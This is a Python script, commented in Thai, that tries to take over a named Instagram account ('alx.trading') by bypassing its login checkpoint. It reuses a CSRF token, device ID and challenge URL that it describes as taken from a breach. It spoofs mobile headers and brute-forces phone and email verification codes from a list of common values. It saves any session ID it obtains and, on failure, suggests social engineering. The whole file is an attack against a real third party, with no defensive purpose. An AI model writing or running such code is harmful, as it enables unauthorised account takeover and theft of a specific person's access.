#!/usr/bin/env python3
"""
DIRECT CHECKPOINT BYPASS
ใช้ข้อมูลที่ได้มาจาก successful breach
"""

import requests
import json
import time
import random

def bypass_with_existing_data():
    # ข้อมูลที่ได้มาจาก successful breach
    csrf_token = "TlB0E59F45gWaVufZ-LD2W"
    device_id = "D542605A-E1E7-4474-A72F-A517F3E1B4D8"
    checkpoint_url = "/challenge/ASjy4LfL_rtNSy_oOfH6nIhxqiOJw__TzQG72a3w6pPi5MafMfK2I2aiTYT8jAxmghHZ/AST972qvP0lMwEA2-SjYGdCnmB58hWWuru8iO4rrd2ZyG4OpWiSkf2eK44MDePumcskTgdg74laX3Q/"
    
    session = requests.Session()
    
    # ตั้งค่า cookies ที่ได้มา
    session.cookies.set('csrftoken', csrf_token)
    session.cookies.set('ig_did', device_id)
    session.cookies.set('ig_nrcb', '1')
    
    # ตั้งค่า headers
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
        'X-CSRFToken': csrf_token,
        'X-Instagram-AJAX': '1',
        'X-IG-App-ID': '936619743392459',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': f'https://www.instagram.com{checkpoint_url}'
    })
    
    print(f"🎯 DIRECT CHECKPOINT BYPASS ATTEMPT")
    print(f"📱 Using checkpoint: {checkpoint_url[:50]}...")
    print(f"🔑 Using CSRF: {csrf_token}")
    print("=" * 60)
    
    # ขั้นตอน 1: เข้า checkpoint page
    try:
        print(f"\n🔍 Step 1: Accessing checkpoint page...")
        response = session.get(f"https://www.instagram.com{checkpoint_url}")
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            print("✅ Checkpoint page accessible")
            
            # ตรวจสอบ verification options
            content = response.text
            
            if "phone" in content.lower():
                print("📱 Phone verification detected")
                return attempt_phone_bypass(session, checkpoint_url, csrf_token)
                
            elif "email" in content.lower():
                print("📧 Email verification detected")
                return attempt_email_bypass(session, checkpoint_url, csrf_token)
                
            else:
                print("🔄 Unknown verification method")
                return attempt_generic_bypass(session, checkpoint_url, csrf_token)
        else:
            print(f"❌ Cannot access checkpoint: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Error accessing checkpoint: {e}")
        return False

def attempt_phone_bypass(session, checkpoint_url, csrf_token):
    """พยายาม bypass ผ่าน phone verification"""
    print(f"\n📱 PHONE VERIFICATION BYPASS")
    
    try:
        # เลือก phone verification
        choice_data = {
            'choice': '0'  # 0 = phone, 1 = email
        }
        
        response = session.post(
            f'https://www.instagram.com{checkpoint_url}',
            data=choice_data
        )
        
        print(f"Phone selection status: {response.status_code}")
        
        if response.status_code == 200:
            print("✅ Phone verification selected")
            
            # ลอง bruteforce verification codes
            common_codes = [
                "123456", "000000", "111111", "654321", 
                "123123", "456456", "789789", "147258",
                "159753", "987654", "555555", "777777"
            ]
            
            for code in common_codes:
                print(f"🔢 Trying code: {code}")
                
                verify_data = {
                    'security_code': code
                }
                
                verify_response = session.post(
                    f'https://www.instagram.com{checkpoint_url}',
                    data=verify_data
                )
                
                if verify_response.status_code == 200:
                    # ตรวจสอบว่าผ่านมั้ย
                    if 'sessionid' in session.cookies:
                        sessionid = session.cookies['sessionid']
                        print(f"🎯 SUCCESS! SessionID: {sessionid}")
                        
                        # บันทึกผลลัพธ์
                        result = {
                            "bypass_method": "phone_verification_bruteforce",
                            "successful_code": code,
                            "sessionid": sessionid,
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                            "target": "alx.trading",
                            "status": "CHECKPOINT_BYPASSED"
                        }
                        
                        with open(f"CHECKPOINT_BYPASS_SUCCESS_{int(time.time())}.json", 'w') as f:
                            json.dump(result, f, indent=2)
                            
                        return True
                        
                    # ตรวจสอบ URL redirect
                    if 'instagram.com/accounts/login' not in verify_response.url:
                        print(f"✅ Possible success with code: {code}")
                        print(f"Redirected to: {verify_response.url}")
                        return True
                
                time.sleep(random.uniform(2, 5))
            
            print("❌ No common codes worked")
            return False
            
    except Exception as e:
        print(f"❌ Phone bypass error: {e}")
        return False

def attempt_email_bypass(session, checkpoint_url, csrf_token):
    """พยายาม bypass ผ่าน email verification"""
    print(f"\n📧 EMAIL VERIFICATION BYPASS")
    
    # คล้ายกับ phone bypass
    try:
        choice_data = {
            'choice': '1'  # 1 = email
        }
        
        response = session.post(
            f'https://www.instagram.com{checkpoint_url}',
            data=choice_data
        )
        
        print(f"Email selection status: {response.status_code}")
        
        if response.status_code == 200:
            return attempt_phone_bypass(session, checkpoint_url, csrf_token)  # ใช้ logic เดียวกัน
            
    except Exception as e:
        print(f"❌ Email bypass error: {e}")
        return False

def attempt_generic_bypass(session, checkpoint_url, csrf_token):
    """พยายาม bypass แบบทั่วไป"""
    print(f"\n🔄 GENERIC BYPASS ATTEMPT")
    
    try:
        # ลองส่ง empty data
        bypass_data = {
            'submit': 'Continue'
        }
        
        response = session.post(
            f'https://www.instagram.com{checkpoint_url}',
            data=bypass_data
        )
        
        print(f"Generic bypass status: {response.status_code}")
        
        if 'sessionid' in session.cookies:
            print(f"🎯 Generic bypass success!")
            return True
            
        return False
        
    except Exception as e:
        print(f"❌ Generic bypass error: {e}")
        return False

if __name__ == "__main__":
    print("🚀 INSTAGRAM CHECKPOINT BYPASS - DIRECT ATTACK")
    print("Using data from successful breach...")
    print("=" * 60)
    
    success = bypass_with_existing_data()
    
    if success:
        print("\n🎉 CHECKPOINT BYPASS SUCCESSFUL!")
        print("✅ Account access gained")
        print("🔓 alx.trading account compromised")
    else:
        print("\n❌ Checkpoint bypass failed")
        print("💡 May need manual intervention or social engineering")
